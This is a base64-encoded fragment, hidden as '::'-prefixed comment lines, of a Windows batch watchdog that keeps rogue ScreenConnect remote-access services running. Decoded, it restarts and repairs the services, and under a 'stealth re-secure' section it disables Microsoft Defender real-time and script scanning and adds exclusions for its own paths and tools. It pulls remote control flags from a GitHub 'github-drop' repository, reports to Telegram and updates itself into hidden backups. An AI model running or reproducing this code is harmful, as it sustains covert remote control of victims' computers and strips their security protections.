::SSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVN
::U0lFWElUJSkiDQopIGVsc2UgKA0KICBlY2hvIHN2YyByZXN0b3JlZD4+IiVMT0cl
::Ig0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
::dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
::aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJh
::ICJyZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQg
::IlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0siDQopDQoNCjpBZnRlckhlYWwN
::CnJlbSBNMTY6IEFMVCBwcmVzZW50LWJ1dC1zdG9wcGVkIC0+IHJlc3RhcnQsIHRo
::ZW4gcmVwYWlyLWJ5LUdVSUQgKGV2ZXJ5IHRpY2spDQpzYyBxdWVyeSAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJy
::b3JsZXZlbCAxICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::QUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBlcnJvcmxldmVs
::IDEgKA0KICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFpcj4+IiVM
::T0clIg0KICAgIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRf
::RlAlKSIgPm51bCAyPiYxDQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xp
::ZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KICAgIHRpbWVvdXQgL3QgNSAvbm9i
::cmVhayA+bnVsDQogICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::QUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAgIGlmIGVycm9ybGV2
::ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxU
::X0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogICkNCikNCnJl
::bSBNMTc6IEFMVCBzZXJ2aWNlIGVudHJ5IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVn
::aXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVyeSB0aWNrDQpzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBl
::cnJvcmxldmVsIDEgKA0KICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+PiIl
::TE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
::c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAi
::JUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KKQ0KcmVt
::IChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFsIGluIFtFXTsgZm9y
::ZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkNCg0KcmVtIOKUgOKUgCBbRl0g
::c3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERlZmVuZGVyIGV4Y2x1c2lvbiByZWZy
::ZXNoKSDilIDilIANCnJlbSBNMzkvTTQzOiBNcFByZWZlcmVuY2Ugd2hlbiBXaW5E
::ZWZlbmQgYWxpdmU7IGFsd2F5cyBhbHNvIHdyaXRlIHBvbGljeS9leGNsdXNpb24g
::UkVHDQpyZW0gKEhlbGwgaG9zdDogV2luRGVmZW5kIGRlYWQg4oaSIDB4ODAwMTA2
::YmEsIGJ1dCBBTVNJIHN0aWxsIGJsb2NrZWQgUFMg4oCUIHJlZyArIG93bl9ncnl4
::YS5jbWQgY292ZXIgaXQpDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9u
::IiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAx
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
::aWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIg
::L3YgRGlzYWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5u
::dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIgL3QgUkVHX0RX
::T1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
::Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
::RVRMJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlU3lzdGVtUm9vdCVcVGVtcFwudXBkIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
::cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQ
::cm9ncmFtRmlsZXMlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUHJv
::Z3JhbUZpbGVzKHg4NiklXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RX
::T1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
::Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAv
::diAiU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZSIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAi
::bXNpZXhlYy5leGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
::aWN5IEJ5cGFzcyAtQ29tbWFuZCAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2ls
::ZW50bHlDb250aW51ZSc7IHRyeXtTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVh
::bHRpbWVNb25pdG9yaW5nICR0cnVlfWNhdGNoe307IHRyeXtTZXQtTXBQcmVmZXJl
::bmNlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWV9Y2F0Y2h7fTsgdHJ5e0Fk
::ZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVXRCUnLCclRVRMJScsKEpv
::aW4tUGF0aCAkZW52OlByb2dyYW1GaWxlcyAnU2NyZWVuQ29ubmVjdCBDbGllbnQq
::JyksKEpvaW4tUGF0aCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0gJ1NjcmVlbkNv
::bm5lY3QgQ2xpZW50KicpIC1FcnJvckFjdGlvbiBTdG9wfWNhdGNoe307IGZvcmVh
::Y2goJHggaW4gQCgnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1Nj
::cmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnLCdtc2lleGVjLmV4ZScsJ3Bv
::d2Vyc2hlbGwuZXhlJykpe3RyeXtBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Q
::cm9jZXNzICR4IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlfWNhdGNoe319
::IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1z
::ZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVX
::RCVcb3duX3NlY3VyZS5jbWQnKSAtYW5kICgoIC1ub3QgKFRlc3QtUGF0aCAnJVdE
::JVxzZWMuZmxhZycpKSAtb3IgKCgoR2V0LURhdGUpIC0gKEdldC1JdGVtIC1MaXRl
::cmFsUGF0aCAnJVdEJVxzZWMuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsSG91
::cnMgLWdlIDIpKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYx
::DQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+
::IiVMT0clIg0KICBjYWxsICIlV0QlXG93bl9zZWN1cmUuY21kIiA+PiIlTE9HJSIg
::Mj4mMQ0KICBlY2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQopDQoNCnJlbSDilIDi
::lIAgW0cyXSBHcnl4YSBNVVNULVJVTiDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnJl
::bSBPNDA6IGlmIEFOWSBub24tc2V2cnogU0MgUnVubmluZyDihpIgbmV2ZXIgbXNp
::ZXhlYyAoc3RvcHMgcGFuZWwgZHVwbGljYXRlcykuDQpzZXQgIkdSWVhBX09LPTAi
::DQpzZXQgIkdSWVhBX1dBUz0wIg0Kc2V0ICJET19ERUVQPTAiDQpzZXQgIkZPUkNF
::X0c9MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNr
::cSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIp
::IGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwi
::DQoNCnJlbSBGT1JDRSBwdXNoOiBjb250ZW50LWhhc2ggdmlhIGZjIC9iIChyZS1m
::aXJlIHdoZW4gZmxhZyBjb250ZW50IGNoYW5nZXMpOyByYXctZmlyc3QNCiIlQ1VS
::TCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4
::LXRpbWUgMjAgLW8gIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiaHR0cHM6Ly9yYXcu
::Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4v
::Zm9yY2VfZ3J5eGEuZmxhZz90PSVSQU5ET00lJVJBTkRPTSUiID5udWwgMj4mMQ0K
::aWYgbm90IGV4aXN0ICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgIiVDVVJMJSIgLUwg
::LS1jb25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlV0QlXGZvcmNl
::X2dyeXhhLm5ldyIgImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
::eS9naXRodWItZHJvcEBtYWluL2ZvcmNlX2dyeXhhLmZsYWc/dD0lUkFORE9NJSVS
::QU5ET00lIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXGZvcmNlX2dyeXhhLm5l
::dyIgKA0KICBmaW5kc3RyIC9DOiJQVVNIIiAiJVdEJVxmb3JjZV9ncnl4YS5uZXci
::ID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBpZiBub3Qg
::ZXhpc3QgIiVXRCVcZm9yY2VfZ3J5eGEuZG9uZSIgKA0KICAgICAgc2V0ICJGT1JD
::RV9HPTEiDQogICAgKSBlbHNlICgNCiAgICAgIGZjIC9iICIlV0QlXGZvcmNlX2dy
::eXhhLm5ldyIgIiVXRCVcZm9yY2VfZ3J5eGEuZG9uZSIgPm51bCAyPiYxDQogICAg
::ICBpZiBlcnJvcmxldmVsIDEgc2V0ICJGT1JDRV9HPTEiDQogICAgKQ0KICApDQop
::DQoNCnJlbSBEZXRlY3QgYW55IFJ1bm5pbmcgbm9uLXNldnJ6IFNjcmVlbkNvbm5l
::Y3QgKHRydWUgR3J5eGEgcHJlc2VuY2UpDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAi
::JVdEJSIgPiIlV0QlXGdyeXhhX2hlYWx0aC5vdXQiIDI+bnVsDQpzZXQgIkdIPSIN
::CmlmIGV4aXN0ICIlV0QlXGdyeXhhX2hlYWx0aC5vdXQiIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVSIGluICgiJVdEJVxncnl4YV9oZWFsdGgub3V0IikgZG8g
::c2V0ICJHSD0lJVIiDQplY2hvIGdyeXhhX2hlYWx0aD0hR0ghPj4iJUxPRyUiDQpl
::Y2hvICFHSCF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCmlmIG5v
::dCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIkdSWVhBX09LPTEiDQogIHNldCAiR1JZ
::WEFfV0FTPTEiDQogIGlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1
::c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhh
::LmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9G
::UD0lJUwiDQopDQoNCnJlbSBGT1JDRSBwdXNoIG92ZXJyaWRlcyBoZWFsdGh5LXNr
::aXA6IHJ1biBhIGZvcmNlZCBlbnN1cmUgdGhpcyB0aWNrDQppZiAiJUZPUkNFX0cl
::Ij09IjEiICgNCiAgZWNobyBncnl4YV9mb3JjZV9wdXNoX0w0Nl9hY2tfbm9faW5z
::dGFsbD4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxmb3JjZV9ncnl4YS5uZXci
::IGNvcHkgL3kgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiJVdEJVxmb3JjZV9ncnl4
::YS5kb25lIiA+bnVsIDI+JjENCiAgZ290byA6R3J5eGFBZnRlcg0KKQ0KDQpwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigo
::IC1ub3QgKFRlc3QtUGF0aCAnJUdSWVhBX0RFRVAlJykpIC1vciAoKChHZXQtRGF0
::ZSktKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUdSWVhBX0RFRVAlJyAtRm9yY2Up
::Lkxhc3RXcml0ZVRpbWUpLlRvdGFsSG91cnMgLWdlIDgpKXsgZXhpdCAxIH0gZWxz
::ZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSBzZXQgIkRP
::X0RFRVA9MSINCg0KcmVtIEhlYWx0aHkgKyBub3QgZGVlcCBkdWUg4oaSIHplcm8g
::d29yaw0KaWYgIiVHUllYQV9PSyUiPT0iMSIgaWYgIiVET19ERUVQJSI9PSIwIiAo
::DQogIGVjaG8gZ3J5eGFfc2tpcF9hbHJlYWR5X2hlYWx0aHk+PiIlTE9HJSINCiAg
::Z290byA6R3J5eGFBZnRlcg0KKQ0KDQpyZW0gTTQ5IEZSRUVaRTogc3RhcnQtb25s
::eTsgbmV2ZXIgbXNpZXhlYy9vd25fZ3J5eGEgZnJvbSBtb24NCmlmIGV4aXN0ICIl
::V0QlXGdyeXhhX2luc3RhbGwuY21kIiBkZWwgL2YgL3EgIiVXRCVcZ3J5eGFfaW5z
::dGFsbC5jbWQiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGFfbXNpLmxv
::Y2siIGRlbCAvZiAvcSAiJVdEJVxncnl4YV9tc2kubG9jayIgPm51bCAyPiYxDQpp
::ZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIGVjaG8gZ3J5eGFfbW9uX3N0YXJ0X29u
::bHk+PiIlTE9HJSINCiAgc2MgY29uZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUdSWVhBX0ZQJSkiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0KICBzYyBzdGFydCAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAg
::dGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5O
::SU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZl
::bCAxIHNldCAiR1JZWEFfT0s9MSINCiAgaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0K
::ICAgIGZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVy
::eSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVl
::bkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgICAgIHNldCAiX0ZQPSUlYSINCiAg
::ICAgIHNldCAiX0ZQPSFfRlA6ID0hIg0KICAgICAgaWYgL0kgbm90ICIhX0ZQISI9
::PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUFMVF9GUCUiICgNCiAg
::ICAgICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIHwg
::ZmluZHN0ciAvSSAvQzoiUlVOTklORyIgL0M6IlNUQVJUX1BFTkRJTkciID5udWwN
::CiAgICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgICAgc2V0ICJH
::UllYQV9PSz0xIg0KICAgICAgICAgIHNldCAiR1JZWEFfRlA9IV9GUCEiDQogICAg
::ICAgICkNCiAgICAgICkNCiAgICApDQogICkNCikNCmlmICIlRE9fREVFUCUiPT0i
::MSIgZWNobyBkb25lPiIlR1JZWEFfREVFUCUiDQplY2hvIGdyeXhhX2ZyZWV6ZV9u
::b19hdXRvX2luc3RhbGw+PiIlTE9HJSINCg0KOkdyeXhhQWZ0ZXINCmlmIGV4aXN0
::ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRl
::bGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsi
::PT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQpzZXQgIkdSWVhBX09L
::PTAiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUp
::IiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiAv
::QzoiQ09OVElOVUVfUEVORElORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBz
::ZXQgIkdSWVhBX09LPTEiDQpyZW0gTTQ5OiBhbnkgbm9uLXNldnJ6IFJ1bm5pbmcg
::U0MgaXMgT0sgKGFkb3B0IEZQKSDigJQgZG8gbm90IGZhbHNlLURPV04gd3Jvbmcg
::Z3J5eGEuY2ZnDQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIGZvciAvZiAidG9r
::ZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBe
::fCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50
::IicpIGRvICgNCiAgICBzZXQgIl9GUD0lJWEiDQogICAgc2V0ICJfRlA9IV9GUDog
::PSEiDQogICAgaWYgL0kgbm90ICIhX0ZQISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5v
::dCAiIV9GUCEiPT0iJUFMVF9GUCUiICgNCiAgICAgIHNjIHF1ZXJ5ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoIV9GUCEpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkci
::IC9DOiJTVEFSVF9QRU5ESU5HIiAvQzoiQ09OVElOVUVfUEVORElORyIgPm51bA0K
::ICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgIHNldCAiR1JZWEFf
::T0s9MSINCiAgICAgICAgc2V0ICJHUllYQV9GUD0hX0ZQISINCiAgICAgICkNCiAg
::ICApDQogICkNCikNCmlmICIlR1JZWEFfT0slIj09IjAiICgNCiAgcG93ZXJzaGVs
::bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
::cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1oZWFs
::dGggLVdvcmtEaXIgIiVXRCUiIDI+bnVsIHwgZmluZHN0ciAvSSAvQiAvQzoiSEVB
::TFRIWXwiIHwgZmluZHN0ciAvSSAicnVubmluZz0xIiA+bnVsDQogIGlmIG5vdCBl
::cnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KKQ0KDQppZiAiJUdSWVhBX09L
::JSI9PSIxIiBpZiAiJUdSWVhBX1dBUyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
::IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
::ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1yZXN0b3JlZCIg
::Pm51bCAyPiYxDQogIGNhbGwgOlRnR3J5eGEgUkVTVE9SRUQgIkdyeXhhIFNjcmVl
::bkNvbm5lY3QgaGVhbHRoeSAoc3ZjIHJ1bm5pbmcpIg0KKQ0KaWYgIiVHUllYQV9P
::SyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
::aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIu
::cHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZF
::UiUgLUV4dHJhICJncnl4YS1tdXN0LWZhaWwiID5udWwgMj4mMQ0KICBjYWxsIDpU
::Z0dyeXhhIERPV04gIkdyeXhhIE1VU1QtUlVOIC0gc2VydmljZSBub3QgUnVubmlu
::ZyBhZnRlciBoZWFsIg0KKQ0KDQpyZW0g4pSA4pSAIFtIXSBxdWlldCBkaWdlc3Qg
::KHNraXAgaGVhbHRoeSBob3N0cyDigJQgd2FzIGZsb29kaW5nIFRlbGVncmFtKSDi
::lIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
::IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
::ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgPm51bCAyPiYxDQpzZXQgIk5FRURfSEI9
::MCINCmlmICIlUFJJTV9PSyUiPT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAlRk9S
::RUlHTl9MRUZUJSBHVFIgMCBzZXQgIk5FRURfSEI9MSINCmlmICIlR1JZWEFfT0sl
::Ij09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgIiVORUVEX0hCJSI9PSIwIiAoDQog
::IGVjaG8gaGJfc2tpcF9oZWFsdGh5Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigo
::VGVzdC1QYXRoICclSEJGTEFHJScpIC1hbmQgKE5ldy1UaW1lU3BhbiAtU3RhcnQg
::KEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxBRyUnKS5MYXN0V3JpdGVUaW1l
::KS5Ub3RhbE1pbnV0ZXMgLWx0IDM2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0IDEg
::fSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBoYj4l
::SEJGTEFHJQ0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
::dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0
::LnBzMSIgLVN0YXRlIEhCIC1Nb2RlIGNvbXBhY3QgLUJ1aWxkICVNT05WRVIlIC1D
::b3VudCAhQ09VTlQhID5udWwgMj4mMQ0KICAgIGVjaG8gZGlnZXN0IEhCIHNlbnQ+
::PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBh
::cHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0K
::ICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5Pj4iJUxPRyUiDQogIGF0dHJpYiAtaCAt
::cyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogIG1vdmUgL3kgIiVT
::VEFHRSVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYx
::DQopDQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGlj
::aw0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjEN
::CmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAt
::ciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0Ql
::XG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0K
::ZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjENCg0KZWNobyB0aWNrIGRvbmU6
::IHByaW09JVBSSU1fT0slIGdyeXhhPSVHUllYQV9PSyUgYWx0PSVBTFRfT0slIGZv
::cmVpZ249JUZPUkVJR05fTEVGVCU+PiIlTE9HJSINCmVuZGxvY2FsDQpleGl0IC9i
::IDANCg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkCBoZWxwZXJzIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkA0KOkVuc3VyZUdyeXhhTXVzdA0KcmVtIE00OSBGUkVFWkU6
